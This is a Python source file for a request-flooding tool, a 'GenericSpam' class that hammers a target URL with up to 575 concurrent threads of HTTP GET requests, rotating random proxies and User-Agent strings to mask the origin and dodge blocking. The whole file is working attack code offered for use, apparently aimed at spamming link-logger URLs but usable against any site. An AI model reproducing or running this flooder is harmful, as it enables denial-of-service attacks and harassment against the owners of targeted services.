import threading
from requests import get, status_codes
from ..agents.user_agents import agents
from ..proxies.grabProxies import freshProxies
from random import choice
from psutil import cpu_percent
from os import system


class GenericSpam:
    def __init__(self):
        self.thread_limit = 575


    def executeRequest(self, target: str) -> str:
        try:
            x = get(
                target,
                    headers={
                "User-Agent": self.random_agent() + "(you didnt say the magic word.)"
                },
                    proxies={
                    "http": self.proxy(), "https": self.proxy()
                }
                )
            return "\033[0;32mYay!\033[0m"
        except TypeError as e:
            print(f"{e}")

    def buildThreads(self, generic_link):
        if not str(generic_link).startswith("http://"):
            generic_link = str(f"http://{generic_link}")
        grabifyspam = threading.Thread(target = self.executeRequest, args=[str(generic_link), ])
        grabifyspam.start()
        while threading.active_count() >= self.thread_limit:
            system("clear")
            print(f"\033[0;31mCpu or thread limit hit: \nCPU Load: {cpu_percent()}\nThreads: {threading.active_count()}"
                  f"/{self.thread_limit}\033[0m")
            grabifyspam.join(0.75)

    @staticmethod
    def random_agent():
        return str(choice(agents.split("\n")))

    @staticmethod
    def proxy():
        yes_bud = freshProxies()
        return str(yes_bud.randomProxy(True))
